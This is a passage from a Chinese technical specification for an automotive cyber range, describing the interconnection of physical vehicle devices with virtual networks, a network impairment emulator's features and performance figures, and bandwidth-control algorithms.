，支持跨地域的网络测试和模拟需求。</p><p>6）系统支持异地接入的实车、车载零部件、测试工具、物理主机、安全设备、网络设备等，实现与本地接入设备在管理和接入上的无差别。通过统一的管理和接入协议实现，系统确保异地设备的无缝集成和同等级别的网络功能。</p><p>7）系统具备支持异域网络通过路由器或防火墙接入到虚拟网络中的能力。该功能通过灵活的网络配置和管理技术实现，使异域网络能够有效地接入并与虚拟网络实现数据交换和通信。</p><p>8）提供的网络靶场平台具备创建和配置虚拟网络环境的能力，允许用户指定或使用互联网作为公共网络。支持通过在拓扑中配置专用虚拟设备接入到平台配置的公共网络，公共网络可以是用户指定的网络，也可以是互联网。能够支持用户在虚拟设备上直接配置公网IP地址，以便这些虚拟设备能够与外部网络进行通信。这一功能对于模拟真实网络环境中的设备配置以确保测试场景的逼真度和有效性。该平台还支持在虚拟设备中配置路由、VPN和防火墙功能等。这些功能是网络设备的基本配置，用于模拟复杂的网络环境并测试攻击防御策略的有效性。单个虚拟设备能够支持20个VPN链路。这一要求是为了满足高强度的网络攻防测试需求，确保虚拟设备能够处理大量的VPN连接，并提供足够的能力来模拟大规模的网络环境。</p><p>9）系统支持配置场景化目标网络，如车云通信、车内以太网等，及指定子网访问公共网络资源。该功能通过高级网络配置和场景管理技术实现，满足特定网络场景下的测试和模拟需求。</p><p>10）系统功能涵盖为目标网络配置公网IP的能力，或实现将目标网络的特定IP、端口映射到公网IP端口。该功能为目标网络提供了访问互联网的通道，同时允许通过特定的IP和端口实现网络服务的外部访问。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/aca65bfd8b801defa386f81462d89ee6.png"></p><p>IP配置</p><ol><li>提供的平台具备创建配置虚拟VPN的能力，支持配置虚拟VPN接入到互联网中，使公共网络用户能够通过连接VPN的方式接入到目标网络中。可以通过VPN连接进入目标网络，进行网络攻防测试和安全验证。此外，平台还支持配置公共网络IP地址池。通过配置IP地址池，可以为不同的试验环境配置不同的公网IP地址。允许用户为虚拟设备或测试场景分配特定的公网IP地址，以满足特定的网络配置需求。同时，公网IP地址池支持公网IP地址池的管理。用户能够方便地管理IP地址池中的IP地址，包括分配、回收和更新等操作。这有助于确保IP地址的合理使用和避免IP地址冲突。最后，公网IP地址池同时支持不少于2个公有云。可以将靶场部署在不同的公有云平台上，从而获得更大的灵活性和可扩展性。</li></ol><h4 id="性能实施方案-3"><a href="#性能实施方案-3" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1）模块支持不少于100个实物设备的同时接入，可根据实际需求通过扩展虚拟互联交换机进行网络容量增强，适应不同规模的网络需求，并为更多设备提供稳定的接入环境。</p><p>2）虚实互联交换机与包括华为、华三等在内的通用三层交换机兼容。模块的设计无需特殊功能的交换机支持，提供广泛的设备兼容性，降低系统部署和运维的复杂度。</p><p>3）系统具备管理不少于120个公网IP的能力，有效管理大量公网IP地址，满足复杂网络环境下的需求，以支持广泛的网络访问和服务部署。</p><h4 id="技术实现内容-3"><a href="#技术实现内容-3" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数设计方面，系统具备广泛的物理网络接入能力，能够支持实车、车载零部件、测试工具、物理主机、安全设备、网络设备、车载以太网、CAN、LIN等各种物理网络接入方式，并将其连接到由网络靶场平台生成的虚拟网络中，形成虚实结合的目标网络。此外，系统还支持有线透明设备（如IPS等）的透明接入到虚拟网络，可以透明地串联实物设备和虚拟设备之间，同时不改变透明设备的属性。系统还能够支持异地设备的接入，使其与虚拟网络中的虚拟机和容器在同一编址空间内运行，无论是本地接入设备还是异地接入设备，都能够享受相同的管理和接入特性。此外，系统支持异域网络通过路由器或防火墙作为接入点接入到虚拟网络中，并能够配置专用虚拟设备接入到平台配置的公共网络，支持公共网络的配置和管理，包括路由、VPN、防火墙等功能，单个虚拟设备支持最多20个VPN链路。系统还支持为目标网络配置不同的场景，如车云通信、车内以太网等，并指定子网访问公共网络资源，同时还支持配置虚拟VPN，允许公共网络用户通过VPN连接方式接入目标网络，并管理公网IP地址池，可为不同试验环境配置不同的公网IP地址池，支持公网IP地址池的管理。</p><p>性能参数设计方面，系统能够支持100个实物设备同时接入，并可以根据实际情况通过扩展虚拟互联交换机的方式进行扩展，以适应大规模网络接入需求。虚实互联交换机支持通用三层交换机，如华为、华三等，无需特殊功能，使系统更加灵活和可扩展。此外，系统能够管理120个公网IP地址，确保公网资源的充分利用和管理。这些性能参数的设计能满足复杂网络环境下的高效运行和可扩展性需求。</p><p>虚实互联管理模块将实物设备（零部件、测试工具、实车、物理主机、网络设备、安全设备等）或物理网络与靶场基础平台生成的虚拟网络互联，组成统一的汽车目标网络。实物设备通过虚拟互联交换机与靶场基础平台相连。</p><p>功能包含但不限于设备部署、设备管理、列表展示、设备增删改查；对部署成功的设备将展示在列表中，设备管理中对部署好的拓扑中的虚拟设备、实物设备和路由设备进行管理。如为已经部署的虚拟机安装软件或者上传文件，查看实物设备的名称、IP信息，为路由设备进行路由器设置，下发路由配置等操作。</p><p>虚实互联管理模块的功能主要是将虚拟网络环境中无法通过虚拟网络设备提供的服务，通过接入物理设备来实现与虚拟网络的统一融合，以利用物理设备提供的服务并实现服务的可扩展接入。虚实结合的功能模块主要实现两个方面的功能。</p><p>首先，该模块需要定制能够接入的物理设备的类型。物理设备包括防火墙、交换机、路由器、服务器等各种类型，每种设备都有不同的接入方式。因此，该模块需要兼容各种设备的统一接入，以确保与各种物理设备的无缝连接。</p><p>其次，该模块支持物理设备的可视化配置。不同类型的物理设备具有不同的配置内容和配置方式，无法实现配置项的自动化。因此，该系统提供统一的配置界面，以便用户能够方便地对实体网络设备进行配置。通过可视化配置界面，可以进行设备的参数设置、网络拓扑配置等操作，从而实现对物理设备的灵活配置和管理。</p><p>总结而言，虚实互联管理模块的功能是将虚拟网络与物理设备进行统一融合，通过采用虚实互通接口及时钟同步技术，虚拟节点与实体节点能够实现互联。这样可以将虚拟网络与物理网络融为一体，形成既具备统一拓扑架构又维持一致逻辑视图的综合网络环境。</p><p>将虚拟网络与现实的物理网络相连是一项技术手段，它允许虚拟机与实体网络设备之间建立连接和交流。利用这种技术，可以实现虚拟和物理网络的无缝对接，构建出一个既有统一的网络布局也有整齐的逻辑视图的网络系统。系统兼容多样的真实物理网络设备，包括计算机、路由器、交换机、服务器以及各类安全防护装置，满足不同网络组件接入的需求。这种接入支持能让用户将实际的硬件资源集成到网络环境中，以进行全面的测试和模拟。支持实物设备透明接入。支持系统管理员将实物设备注册到场景导调系统，并支持分配给设计人员使用，实物设备互联接入虚拟网络支持与现有SDN控制器对接实现。支持将透明设备接入到目标SDN网络中，并且不能改变设备的透明属性。</p><p>半实物仿真系统由虚实网络配置解析、虚拟节点实物节点互联模块组成：</p><p>1. 虚实网络配置解析：通过提取虚拟节点与实体设备的连接关系、配置信息关系等信息得出完整的网络拓扑。</p><p>2. 虚拟节点和实物节点互联：通过网络虚拟化技术提供虚拟节点的仿真实现，运用虚实转化接口和时钟同步机制可以使虚实节点互联互通。系统能够把虚拟网络和实体网络设备无缝集成，创建出一个统一的网络拓扑结构，同时提供一个整合的逻辑视图，形成一个完整的目标网络环境。这样的设计使得网络规划和管理变得更为好看，有助于用户理解和监控整个网络架构的运行状态。</p><p>半物理仿真系统能够处理来自虚拟节点的部署数据和虚拟与现实联动信息，通过其网络配置分析模块来解读这些配置，并利用虚拟与实体联接模块创建虚拟与实体设备之间的网络连接。</p><p>虚实互联模块封装了BGP协议相关的接口，它通过和虚实网络构建子系统中的SDN控制器的控制模块进行通讯，实物接入子系统使用BGP协议和边界路由器交换路由，并使用netconf协议给边界路由器发送配置状态。</p><p>NETCONF基于XML的网络配置协议，NETCONF协议采用了分层结构，每个层分别对协议的某一个方面进行包装，并向上层提供相关的服务。分层结构能让每个层只关注协议的一个方面，实现起来更加简单，同时合理的解耦各个层之间的依赖，可以将各层内部实现机制的变更对其它层的影响降低到最低。</p><p>边界路由器采用VXLAN封装技术，它能够桥接基于软件的网络覆盖层和底层物理基础设施之间的网络服务。VXLAN是最简单的桥接传统网络到虚拟化的部署方式，使传统网络完全过渡到完全虚拟化的网络。物理硬件中部署的 VXLAN将“优化和控制”网络虚拟化，最终将虚拟网络和物理网络融合在一起，正如OpenFlow和传统2、3层网络一样。VXLAN能使工作负载从一个路由网络移动到另一个，或者从一个子网转移到另一个，同时保留IP地址。并且，它允许网络进行扩展。因此，外界设备计入到虚拟网络中，只需要配置物理设备的IP到具体网络间的映射，并将规则配置懂啊边界路由器内，由边界路由器维护配置的转发规则，就可以连通虚拟网络和物理网络或者某个设备。</p><p>系统具备各项功能，能够轻松将IPS等有线透明设备无缝集成进虚拟网络中。透过串联实物设备，实现虚拟与实体设备的互联，且不会影响透明设备的特性，保持其不可见性。实物设备可与虚拟机和容器在同一网络地址空间中运行，共享IP地址范围，确保无缝通讯。系统还支持远程设备接入，可经由路由器或防火墙加入虚拟网络，享受与本地设备同等的管理与接入。系统提供了配置访问公网资源的选项，包括指定的子网、公网IP池和端口映射功能，增强了网络管理的灵活性和跨网络操作的能力。</p><p>支持通过在拓扑中配置专用设备接入到平台配置的公共网络的功能。这些专用设备可以通过用户指定的网络或互联网进行接入，并直接在设备上配置公网IP。系统也允许在专用设备上进行路由、VPN和防火墙等功能的配置，以增强网络安全性和扩展连接能力。同时，支持配置虚拟VPN，让公共网络用户通过连接虚拟VPN的方式安全地接入到目标网络中。系统可以提供一个图形化界面，以方便用户在拓扑中配置专用设备接入到公共网络，并支持必要的网络功能配置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f68b44aa45dded98315899a0c2fa39d8.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4a67304a1a9b92144ddcc5b64caf150b.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ff3580ec83eb74e4f7f84b33cabd7d94.png"></p><p>实物网络虚拟节点映射</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/22fa38cee4de44657edfa2feda88497d.png"></p><p>VPN接入</p><p>（一）虚实网络接入架构：</p><p>虚实互联：实现虚实资源互联的接入架构，保证实物设备和虚拟网络的无缝融合。</p><p>透明设备接入：设计透明接入模块，使IPS等有线透明设备能够无缝接入虚拟网络。</p><p>同一编址空间：确保实物设备与虚拟网络中的虚拟机和容器处于同一编址空间。</p><p>（二）异地设备接入</p><p>异地接入无差别：提供异地设备接入解决方案，确保异地接入设备与本地设备管理和操作上无差别。</p><p>异域网络接入：支持异域网络通过路由器或防火墙接入到虚拟网络中。</p><p>（三）网络功能配置：</p><p>公共网络接入：允许虚拟设备接入到指定的公共网络或互联网，并配置网络功能。</p><p>场景化网络配置：支持配置特定场景的目标网络，如车云通信、车内以太网等。</p><p>公网IP管理：实现公网IP配置和管理模块，支持公网IP地址池的管理。</p><p>（四）性能数满足：</p><p>实物设备接入能力：确保系统支持不少于100个实物设备的接入。</p><p>公网IP管理能力：确保系统能够管理不少于120个公网IP。</p><p>实施步骤</p><p>（五）需求分析与规划：</p><p>分析虚实结合网络接入和管理的需求。</p><p>规划系统架构和功能模块。</p><p>（六）系统开发：</p><p>开发虚实网络接入模块。</p><p>实现透明设备接入功能。</p><p>设计异地设备接入方案。</p><p>开发网络功能配置模块。</p><p>（七）测试与优化：</p><p>进行单元测试、集成测试和性能测试。</p><p>根据测试结果优化系统性能。</p><p>（八）部署与监控：</p><p>在实际环境中部署系统。</p><p>监控系统运行情况，确保性能参数满足要求。</p><p>（九）技术选型</p><p>网络虚拟化：使用Open vSwitch、VMware NSX等网络虚拟化技术。</p><p>远程接入：采用VPN、SD-WAN等技术实现异地设备的安全接入。</p><p>IP地址管理：使用IPAM解决方案进行公网IP地址池的管理。</p><p>网络设备支持：确保系统兼容通用三层交换机如华为、华三等品牌。</p><p>（十）预期结果</p><p>成功实现一个高效、可靠的虚实结合网络接入和管理系统。</p><p>满足包括异地设备在内的实物设备与虚拟网络的无缝接入和管理。</p><p>提供灵活的网络功能配置，支持场景化网络和公网IP的管理。</p><h3 id="虚拟网络支撑模块"><a href="#虚拟网络支撑模块" class="headerlink" title="虚拟网络支撑模块"></a>虚拟网络支撑模块</h3><p>虚拟网络支撑模块实现虚拟网络的链路仿真，建立虚拟网络节点间通信链路，支持虚拟网络拓扑结构的自动化配置和快速重构，实现仿真网络带宽、延迟等特需定义。</p><h4 id="功能实施方案-4"><a href="#功能实施方案-4" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLvccn</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>提供2U标准网络机箱，该模块采用2U标准网络机箱设计，满足空间和扩展性的需求。</li><li>提供1个10/100/1000Base-T管理网口，提供了一个管理网口，支持多种网络速度，方便用户进行远程管理和配置。</li><li>提供6个万兆SFP＋业务网口组成三组万兆物理仿真引擎，具备6个万兆SFP＋业务网口，可以组成三组万兆物理仿真引擎，提供高速数据传输和处理能力。</li><li>提供Web图形化控制界面，提供友好的Web图形化控制界面，可以通过简单的图形化操作进行配置和管理。</li><li>提供的每个引擎可以创建不少于15条独立的双向虚拟链路，整机三个引擎一共可以创建不少于45条虚拟链路，每条虚拟链路的损伤参数可以独立配置：每个物理仿真引擎支持创建不少于15条独立的双向虚拟链路，整机支持创建不少于45条虚拟链路，且每条虚拟链路的损伤参数可独立配置，满足了用户对于不同虚拟链路配置的需求。</li><li>提供的每个网口可以支持不少于45个报文过滤规则：每个网口支持不少于45个报文过滤规则，提供了强大的报文过滤功能，确保了数据的安全性和准确性。</li><li>提供的单个仿真引擎每个方向的报文处理性能为1500000pps：单个仿真引擎每个方向的报文处理性能达到1500000pps，保证了高速的数据处理能力。</li><li>能够支持带宽抖动控制，可以通过正弦曲线、矩形曲线等曲线控制带宽大小周期性变化：提供了带宽抖动控制功能，可以通过正弦曲线、矩形曲线等曲线实现带宽大小周期性变化，模拟真实的网络环境。</li><li>系统还支持队列深度功能，队列深度最大可以设置为10000Packets。可以根据需要以ms为单位调节队列深度，以模拟实际网络中的队列行为。这种功能使得用户能够更好地理解和控制网络流量，并通过队列管理来模拟各种网络场景。通过队列深度功能，可以更好地理解和评估网络性能，以及优化网络配置和调度策略。</li><li>能够通过带宽控制功能和队列深度功能可以达到流量整形效果：通过带宽控制和队列深度功能，可以实现流量整形效果，进一步模拟真实的网络环境。</li><li>能够支持MTU功能：提供了MTU功能，以满足不同的网络需求。</li><li>能够支持构造时延：支持构造时延功能，以模拟网络中的延迟情况。</li><li>支持多种时延抖动模式，包括平均分布、正态分布、自定义分布、伽马分布等。此外，通过报文的乱序、保序等方式来进行时延抖动，以模拟实际网络中的时延抖动和报文传输情况，为用户提供了多样化的时延抖动配置选择。这种时延控制和抖动模式为用户提供了更真实的网络环境，有助于他们更好地测试和评估网络性能。</li><li>能够支持随机丢包：可以模拟随机的丢包情况，增强了测试的真实性。</li><li>支持周期性丢包、突发丢包和Gilbert－Elliott双通道丢包。周期性丢标包括但不限于由网络拥塞或路由器性能波动引起的丢包现象。突发丢包采取相应的流控制、拥塞控制等策略，以确保通信的稳定性。这种策略有助于缓解由临时性问题、拥塞或传输链路故障引起的通信中断，Gilbert－Elliott双通道丢包更精准地适应通信信道的状态切换，从而优化协议设计和提高通信的适应性。这些不同的丢包模式为用户提供了更全面的测试场景，以评估和测试网络在不同情况下的性能表现。</li><li>系统支持插入误码，并允许在报文的指定字节范围内插入误码。在插入误码时，可以选择重新计算CRC或者不重新计算CRC，以模拟实际网络中的误码和CRC校验情况。这种功能有助于用户测试和评估网络的纠错能力和数据传输的准确性。</li><li>支持报文乱序功能，以模拟实际网络中的报文传输情况。可以设置不同的乱序模式和乱序程度，以测试网络在报文乱序情况下的性能表现。这种功能有助于用户了解网络的稳定性和可靠性，以及优化网络配置和调度策略。</li><li>支持重复报文功能，以模拟实际网络中的重复报文传输情况。可以设置不同的重复报文模式和重复次数，以测试网络在处理重复报文时的性能表现。这种功能有助于用户了解网络的稳定性和可靠性，以及优化网络配置和调度策略。</li><li>系统支持报文任意字段篡改功能，允许用户篡改报文的任意字段，以模拟实际网络中的恶意攻击和篡改情况。这种功能有助于用户测试和评估网络的防御能力和安全性，以及提高对网络安全威胁的认知和应对能力。</li><li>系统内置了网络损伤抓包分析功能，支持对指定的物理链路或者虚拟链路进行抓包分析。通过图表展现每个报文所经历的延迟、丢包、误码等损伤状况，可以更形象的了解网络的性能表现和损伤情况。同时，可以将损伤分析文件保存在设备内部，用于日后回溯和深入分析。这种功能为用户提供了强大的分析和调试工具，有助于他们更好地理解网络行为和性能表现。</li><li>支持通过指定IPv4地址进行报文分类处理。可以根据实际需求，按照IPv4地址对报文进行分类，以便更好地控制和管理网络流量。这种功能为用户提供了更好的网络控制选项，有助于他们更好地理解和控制网络流量。</li><li>IPv4地址，系统还支持通过指定IPv6地址进行报文分类处理。随着IPv6网络的普及，这种支持IPv6地址的报文分类功能为用户提供了更大的灵活性，使他们能够更好地适应和测试各种网络环境。</li><li>系统还支持通过指定MAC地址进行报文分类处理。MAC地址是网络中设备的唯一标识，通过MAC地址进行报文分类，可以更好地识别和管理网络中的设备，以及他们的流量和行为。</li><li>系统还支持通过指定VLAN进行报文分类处理。VLAN是一种用于分隔网络流量的技术，通过VLAN标签对报文进行分类，可以更好地控制和管理不同VLAN之间的流量和通信。</li><li>系统还支持通过指定MPLS标签进行报文分类处理。MPLS是一种用于构建高性能网络的标签交换技术，通过MPLS标签进行报文分类，可以更好地利用和优化MPLS网络的性能。</li><li>系统还支持指定TCP、UDP端口进行报文分类处理。TCP和UDP端口是网络中应用程序通信的端点，通过指定端口对报文进行分类，可以更好地识别和管理不同应用程序的流量和行为。</li><li>系统还支持通过指定报文偏移量进行报文分类处理。报文偏移量是指报文中的某个特定位置相对于报文起始的偏移量，通过报文偏移量进行报文分类，可以定位和识别报文中的特定信息。</li><li>系统还支持同时组合多种报文分类规则进行报文分类处理。通过组合多种分类规则，可以更加灵活地定义自己的分类逻辑，以适应不同的测试和模拟需求。这种组合分类功能为用户提供了更大的自定义空间，有助于他们更好地满足特定的网络测试需求。</li><li>系统支持将设置保存在设备内部，确保在断电后重新开机时自动恢复到上一次保存的状态。这种持久化设置功能为用户提供了更大的便利性，避免了每次重启设备时重新配置的繁琐操作。</li><li>系统提供实时的图形化的数据统计表格和曲线，方便了解网络的实时状态和性能表现。统计数据可以保存为csv文件，方便进行进一步的数据分析和处理。这种数据可视化功能为提供了更方便的网络性能监测和分析工具，有助于他们更好地理解和评估网络性能。</li><li>提供的模块内置天津、北京、上海、重庆、成都、杭州、南京、福州、济南、广州、合肥、沈阳、西安等地服务器与国内32地（23个省、5个自治区、4个直辖市）的客户端之间的2G、3G、4G、Wifi网络的基础网络环境配置模板，该模块内置了丰富的网络环境配置模板，涵盖了多个地域和不同网络制式，提供了便捷的基础配置方案。</li><li>能够支持通过配套的windows App或者安卓App录制网络的上下行带宽、延迟、丢包率变化过程，生成txt回放文件。每条虚拟链路都支持导入txt回放文件进行上下行带宽、延迟、丢包率变化过程的回放，回放进度可通过进度条调节，回放过程可通过曲线图观察，该模块支持通过配套的Windows App和安卓App录制网络性能参数的变化过程，并生成TXT回放文件。每条虚拟链路都可以导入TXT回放文件进行回放，回放进度可通过进度条调节，回放过程可通过曲线图观察。这一功能提供了强大的性能参数录制和回放能力，支持对网络性能进行深入分析和测试。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/70bb759597a67c2fed33028a0f57c621.png"></p><p>流量回放控制</p><ol><li>能够支持restfulAPI和Python API，通过API可以每0.1秒修改一次所有参数，该模块提供了Restful API和Python API两种接口方式，能够每0.1秒修改一次所有参数，以满足对参数调整频率和灵活性的需求。</li><li>具备路由器的仿真功能，要求路由器仿真还原度达到100%，包括支持RIP、OSPF、BGP、MPLS等常用协议，支持配置IPsec、OpenVPN等多种VPN协议，支持VXLAN协议，并能够与实物路由器互联互通：该模块具备高度还原的路由器仿真功能，支持多种常用协议和VPN协议，并能够与实物路由器实现互联互通。这一功能提供了真实且全面的路由器仿真环境，能进行路由器相关的测试和研究。</li><li>模块负责为构建的虚拟网络提供数据交换和网络隔离功能，支持自动构建DHCP服务为虚拟节点分配IP，支持指定虚拟节点的MAC和IP，该模块具备数据交换和网络隔离功能，能够自动构建DHCP服务为虚拟节点分配IP地址，同时允许指定虚拟节点的MAC和IP地址。这一功能提供了灵活的网络配置和管理能力。</li></ol><h4 id="性能实施方案-4"><a href="#性能实施方案-4" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>该虚拟网络支撑模块支持带宽控制范围从0到10000Mbps，并且最小控制颗粒度可以达到1bps。满足对网络带宽进行控制的需求，能够在不同场景下模拟各种带宽条件，进行网络性能测试和分析。</li><li>该模块支持报文乱序控制，控制颗粒度可以达到0.001%。提供了对报文发送顺序的控制功能，可以模拟真实网络环境中的各种报文乱序情况，帮助进行相关测试和研究。</li><li>该模块支持重复报文控制，控制颗粒度同样可以达到0.001%。能够模拟发送重复报文的情况，以测试网络设备对重复报文的识别和处理能力，有助于优化网络性能和可靠性。</li><li>该模块支持丢包控制，丢包范围可以从0%到100%，控制颗粒度可以达到0.0001%。提供丢包率控制能力，可以模拟各种丢包情况下的网络环境，对网络设备的丢包处理能力进行测试和评估。</li><li>该模块支持构造时延，时延范围可以从0到10秒，控制颗粒度为0.1ms。提供了时延控制能力，可以模拟不同时延条件下的网络环境，进行网络性能测试、故障排查和优化。</li><li>该模块支持构建不少于1000个隔离网络，满足对大规模虚拟网络环境的需求。通过构建多个隔离网络，可以独立地模拟不同网络环境下的各种场景，进行更为全面和细致的网络测试和分析。</li><li>该模块支持构建不少于5000个虚拟端口，提供了更大的虚拟节点规模。更多的虚拟端口可以在单个虚拟网络中创建更多的节点，模拟更为复杂的网络拓扑和流量模式，可以进行大规模的网络性能测试、故障模拟和数据分析。</li></ol><h4 id="技术实现内容-4"><a href="#技术实现内容-4" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>虚拟网络支撑模块可以建立起虚拟节点之间的通信链路,从而实现整个虚拟网络拓扑的自动化配置和快速重构。通过仿真网络中的带宽、延迟等参数,可以定制出特定的网络环境。这为测试人员提供了高度灵活性,使其能够根据测试需求快速搭建不同的虚拟网络拓扑结构和参数,大大提升测试效率。</p><p>功能参数设计方面，平台具备丰富的网络仿真功能。它采用2U标准网络机箱，拥有1个10/100/1000Base-T管理网口以及6个万兆SFP＋业务网口，这些网口组成了三组万兆物理仿真引擎。平台提供了Web图形化控制界面，可以通过该界面进行各种网络仿真设置和控制。</p><p>每个仿真引擎可以创建15条独立的双向虚拟链路，整机三个引擎一共可以创建45条虚拟链路，每条虚拟链路的损伤参数可以独立配置。此外，每个网口支持45个报文过滤规则，单个仿真引擎每个方向的报文处理性能为1500000pps。平台还支持带宽抖动控制、队列深度功能以及MTU功能，可以实现流量整形和各种网络仿真需求。它还支持各种报文损伤模式，包括时延抖动、随机丢包、周期性丢包、报文乱序、重复报文、报文任意字段篡改等。平台内置网络损伤抓包分析功能，支持对指定的物理链路或虚拟链路进行抓包分析，以便日后的故障排查和分析。</p><p>性能参数设计方面，平台支持多项控制和配置，包括带宽控制、报文乱序控制、重复报文控制、丢包范围控制、构造时延范围控制、隔离网络的构建以及虚拟端口的构建。它具备出色的带宽控制范围，支持从0到10000Mbps的控制，最小控制颗粒度为1bps。此外，它还支持对乱序、重复报文和丢包的高精度控制，以及时延范围的设置。平台可以构建1000个隔离网络和5000个虚拟端口，满足不同仿真场景的需求。这些性能参数确保了平台在网络仿真和测试方面的高度可配置性。</p><p>1. 系统概述</p><p>本方案设计一款车载网络仿真与管理系统，该系统将使用2U标准网络机箱，集成高性能的网络仿真引擎，提供丰富的网络损伤模拟、分析和管理功能。系统的设计满足车载网络环境的测试、评估及研发需求。系统将内置天津、北京、上海、重庆、成都、杭州、南京、福州、济南、广州、合肥、沈阳、西安等中国主要城市之间的网络环境配置模板。这些模板将模拟包括2G、3G、4G、WiFi在内的各种网络环境，以及这些城市与中国其它32地（包括23个省、5个自治区、4个直辖市）客户端之间的网络通信特性。</p><p>2. 硬件配置</p><p>机箱规格：2U标准网络机箱，适合各种机架安装环境。</p><p>管理网口：1个10/100/1000Base-T网口，用于系统管理和控制。</p><p>业务网口：6个万兆SFP+端口，分为三组，每组提供两个端口，组成物理仿真引擎。</p><p>3. 仿真引擎</p><p>虚拟链路：每个仿真引擎可创建至少15条双向虚拟链路，合计至少45条。</p><p>报文处理性能：每个仿真引擎每个方向的报文处理能力为1500000pps。</p><p>报文过滤规则：每个网口支持至少45个报文过滤规则。</p><p>4. 软件功能</p><p>控制界面：Web图形化界面，用于控制和监控系统状态。</p><p>网络损伤模拟：支持带宽抖动、队列深度调节、MTU设置、时延构造等多种仿真。</p><p>损伤抓包分析：内置分析工具，可对物理及虚拟链路进行抓包分析，记录延迟、丢包、误码等数据。</p><p>报文分类处理：支持基于IPv4/IPv6地址、MAC地址、VLAN、MPLS标签、TCP/UDP端口等的报文分类处理。</p><p>持久性与可视化：配置信息可存储于设备内部，断电后可恢复；提供实时数据统计和曲线图。</p><p>5. 网络环境模板</p><p>预设模板：内置主要城市之间的2G、3G、4G、Wifi网络环境配置模板。</p><p>6. 回放功能</p><p>网络状态回放：支持通过Windows或Android App录制网络状态，并生成txt回放文件。</p><p>7. API支持</p><p>API接口：提供restfulAPI 和Python API，支持高频率的参数调整。</p><p>8. 路由器仿真</p><p>仿真协议：支持RIP、OSPF、BGP、MPLS等协议，以及IPsec、OpenVPN、VXLAN等技术。</p><p>9. 数据交换与网络隔离</p><p>网络构建：模块提供数据交换和网络隔离功能，支持DHCP服务和手动指定MAC/IP。</p><p>10. 实施步骤</p><p>硬件采购与组装：</p><p>精选符合性能的硬件组件。</p><p>完成网络机箱的组装和配置。</p><p>软件开发与集成：</p><p>开发Web控制界面和后端仿真逻辑。</p><p>集成所有软件功能，确保系统稳定运行。</p><p>系统测试：</p><p>对每项功能进行严格测试，确保性能符合要求。</p><p>对系统进行压力测试，验证稳定性和可靠性。</p><p>13. 技术选型</p><p>仿真技术：采用先进的网络仿真技术模拟真实网络环境。</p><p>前端技术：使用现代Web技术栈，如React或Vue.js，构建用户界面。</p><p>后端技术：利用高性能的后端框架，如Node.js或Python Flask，提供稳定的API服务。</p><p>14. 预期结果</p><p>实现一款功能全面、性能优越的车载网络仿真与管理系统。</p><p>提供真实、准确的网络环境仿真，适用于广泛的测试和评估场景。</p><p>系统操作简便，支持多种网络环境的快速配置和管理。</p><h5 id="带宽控制"><a href="#带宽控制" class="headerlink" title="带宽控制"></a>带宽控制</h5><p>带宽控制原理</p><p>1. 基于流的带宽控制</p><p>基于流的带宽控制是根据流的标识符来控制流量的传输速率。流的标识符可以是源地址、目的地址、端口号、协议类型等。基于流的带宽控制可以实现细粒度的带宽控制，可以根据不同的流类型或不同的应用程序来分配不同的带宽。</p><p>基于流的带宽控制算法可以分为以下几种类型：</p><p>令牌桶算法：令牌桶算法是基于令牌桶的简单但有效的带宽控制算法。令牌桶算法会定期向桶中放入令牌，流量只能在令牌桶中还有令牌时才能发送。</p><p>窗口算法：窗口算法是基于窗口的带宽控制算法。窗口算法会维护一个窗口，窗口大小代表了当前可用的带宽。流量只能在窗口中还有空间时才能发送。</p><p>拥塞控制算法：拥塞控制算法是用于控制网络拥塞的带宽控制算法。拥塞控制算法会根据网络的拥塞情况来调整流量的传输速率。</p><p>2. 基于端口的带宽控制</p><p>基于端口的带宽控制是根据端口号来控制流量的传输速率。端口号是应用程序使用的标识符，不同的应用程序通常使用不同的端口号。基于端口的带宽控制可以实现简单的带宽控制，可以根据不同的应用程序来分配不同的带宽。</p><p>基于端口的带宽控制算法可以分为以下几种类型：</p><p>固定带宽控制：固定带宽控制是将每个端口的带宽固定为一个值。</p><p>动态带宽控制：动态带宽控制会根据网络的负载情况来调整每个端口的带宽。</p><p>3. 基于路由的带宽控制</p><p>基于路由的带宽控制是根据路由表来控制流量的传输速率。路由表中记录了网络中的路由信息，包括路由的源地址、目的地址、下一跳地址和带宽。基于路由的带宽控制可以实现灵活的带宽控制，可以根据不同的路由来分配不同的带宽。</p><p>基于路由的带宽控制算法可以分为以下几种类型：</p><p>基于路由表的带宽控制：基于路由表的带宽控制是直接使用路由表中的带宽信息来控制流量的传输速率。</p><p>基于路径的带宽控制：基于路径的带宽控制会根据流量的路径来计算流量的传输速率。</p><p>通过控制带宽，网络专业人员可以更好地评估应用程序、设备或系统在不同网络环境下的性能表现，并进行有效的性能优化、安全测试和攻防演练。这些方法和工具可以在网络靶场中组合使用，以便根据需要模拟各种网络条件。</p><p>以下是网络靶场内基于虚拟网络NFV的带宽控制算法：</p><p>令牌桶算法：令牌桶算法是一种常见的带宽控制方法，它基于令牌桶的概念来限制数据包的传输速率。虚拟网络中可以配置令牌桶算法，以确保网络流量不超出所分配的带宽。</p><p>Leaky Bucket（漏桶）算法：漏桶算法是另一种流量调整工具，它模拟了一个有限容量的桶，数据包以固定速率从桶中流出。当桶满了，多余的数据包将被丢弃。</p><p>流量整形（Traffic Shaping）：流量整形是一种广泛使用的带宽控制方法，它通过调整传输速率、缓冲区大小和延迟等参数，来限制数据流的速率。用于模拟不同的带宽条件。</p><p>Quality of Service（QoS）：QoS 